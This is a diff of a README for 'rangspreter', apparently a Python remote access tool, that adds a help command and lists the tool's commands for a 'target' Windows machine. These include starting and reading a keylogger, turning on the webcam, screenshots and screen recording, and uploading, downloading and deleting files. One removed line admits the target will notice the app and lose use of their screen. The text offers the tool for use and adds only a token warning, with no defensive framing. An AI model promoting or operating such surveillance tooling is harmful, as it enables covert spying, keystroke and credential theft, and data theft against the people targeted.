@@ -18,13 +18,35 @@ Inspirations: <a href="https://www.youtube.com/@pythonproject940">Python Project
 
 ## New Update 
 
-I add screen recording feature that can record target screen. BUT, Your target will notice that's python app is open. AND if he open it, his screen become black and he can't do anything. Be careful and DON'T USE THIS PROJECT TO YOUR BAD IDEA!. Here's how to use it
+I add options feature. So you don't need to see this README again and again. Here's what it's look like!
 
 ```
 	 ░█▀▄░█▀█░█▀█░█▀▀░█▀▀░█▀█░█▀▄░█▀▀░▀█▀░█▀▀░█▀▄
 	 ░█▀▄░█▀█░█░█░█░█░▀▀█░█▀▀░█▀▄░█▀▀░░█░░█▀▀░█▀▄
 	 ░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░▀░░░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀
-rangspreter>> sr
+rangspreter>> h
+
+Options after get in:
+  wipe 					clear rangspreter output (instead clear command)
+  ul                    upload file to target
+  dl                    download file from target
+  exit, out             get out from target
+  sl                    start keylogger (when you are start keylogger, you can't use any of those commands)
+  rl                    read keylogger (don't use this command if you don't start keylogger/sl)
+  stl                   stop keylogger (don't use this command if you don't start keylogger/sl)
+  wcam                  start web camera (use escape button to stop webcam)
+  sh                    screenshot target monitor
+  sr					screen recording
+  h						(NEW FEATURE) show options
+
+Default windows options:
+  mkdir                 make directory/folder
+  rmdir                 remove directory/folder
+  del                   delete file
+  ipconfig              see target IP details
+  whoami                who you are in the target
+  move 					move file to other directory
+
 ```
 
 ## Linux Installation
@@ -72,7 +94,8 @@ Options after get in:
   stl                   stop keylogger (don't use this command if you don't start keylogger/sl)
   wcam                  start web camera (use escape button to stop webcam)
   sh                    screenshot target monitor
-  sr					(NEW FEATURE) screen recording
+  sr					screen recording
+  h						(NEW FEATURE) show options
 
 Default windows options:
   mkdir                 make directory/folder
